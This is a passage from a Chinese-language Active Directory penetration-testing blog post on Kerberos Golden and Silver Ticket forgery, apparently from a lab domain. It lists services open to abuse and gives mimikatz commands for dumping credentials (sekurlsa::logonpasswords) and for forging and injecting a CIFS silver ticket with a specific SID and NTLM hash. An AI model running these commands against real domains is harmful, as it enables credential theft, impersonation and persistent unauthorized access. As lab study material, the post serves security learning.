<figure data-type="image" tabindex="3"><img src="https://thekingofduck.github.io/post-images/1583326531630.png" alt="" loading="lazy"></figure>
<p>图中红线前后为导入金票前后的权限差异。</p>
<p>值得一提的是目前这个金票只能在域内使用使用，不能跨域，涉及到跨域，域森林时该金票就被局限了，不过可以配合SIDHistory去生成包含根域的金票。</p>
<p>可参考：http://t3ngyu.leanote.com/post/7697c6e55644</p>
<h4 id="silver-tickets">Silver Tickets</h4>
<p>已知目标机器的NTLM hash和域SID时，可以伪造任意用户访问目标机器上的指定服务。其过程不会与KDC通信，因此不会再KDC上留下任何痕迹，只会在目标机器和本机留下日志。可以利用的服务：</p>
<table>
<thead>
<tr>
<th>服务注释</th>
<th>服务名称</th>
</tr>
</thead>
<tbody>
<tr>
<td>WMI</td>
<td>HOST&amp;RPCSS</td>
</tr>
<tr>
<td>Powershell Remoteing</td>
<td>HOST&amp;HTTP</td>
</tr>
<tr>
<td>WinRM</td>
<td>HOST&amp;HTTP</td>
</tr>
<tr>
<td>Scheduled Tasks</td>
<td>HOST</td>
</tr>
<tr>
<td>LDAP、DCSync</td>
<td>LDAP</td>
</tr>
<tr>
<td>Windows File Share（CIFS）</td>
<td>CIFS</td>
</tr>
<tr>
<td>Windows Remote Server Administration Tools</td>
<td>RPCSS&amp;LDAP&amp;CIFS</td>
</tr>
</tbody>
</table>
<p>伪造条件</p>
<ul>
<li>
<p>Domain SID</p>
</li>
<li>
<p>Domain name</p>
</li>
<li>
<p>目标机器的NTLM hash</p>
</li>
<li>
<p>任意用户</p>
<p>伪造过程：</p>
<p>导出目标机器的hash：</p>
</li>
</ul>
<pre><code>mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot;  &quot;exit&quot; &gt; hash.txt
</code></pre>
<figure data-type="image" tabindex="4"><img src="https://thekingofduck.github.io/post-images/1583327211454.png" alt="" loading="lazy"></figure>
<pre><code>mimikatz &quot;kerberos::golden /domain:adstudy.com /sid:S-1-5-21-290613818-3246529070-3099575750 /target:bot.adstudy.com /service:cifs /rc4:b0f256f8b3bca01555101864efef02ac /user:silver /ptt&quot; &quot;exit&quot;
</code></pre>
<figure data-type="image" tabindex="5"><img src="https://thekingofduck.github.io/post-images/1583329253794.png" alt="" loading="lazy"></figure>
<p>伪造成功后可使用klist查看票据,指令中伪造的服务是cifs，即Windows File Share（CIFS），在域内机器上测试的，本身就没限制，所以伪造了银票也没啥子用，就不截图了，如果伪造其他有权限限制机器上的服务即可越过限制。</p>
<h3 id="总结">总结</h3>
<p>金票权限大，但是要过kdc，会留下日志。<br>
银票局限在特定服务内使用，不过kdc，只在域服务机器上留下日志。</p>
<p>两者分别去读hash时都需要管理员权限，这是致命的缺陷，在攻击过程中就出现：</p>
<p>&quot;有管理权限就可以直接读管理密码了，要金票银票何用？&quot;</p>
<blockquote>
<p>可以用在权限维持上。</p>
</blockquote>
<p>参考文章：</p>
<p><a href="http://t3ngyu.leanote.com/post/Silver-Tickets">域渗透-权限维持之 Silver Tickets</a><br>
<a href="https://github.com/uknowsec/Active-Directory-Pentest-Notes/blob/master/Notes/%E5%9F%9F%E6%B8%97%E9%80%8F-Ticket.md">域渗透-Ticket</a></p>
]]></content>
    </entry>
</feed>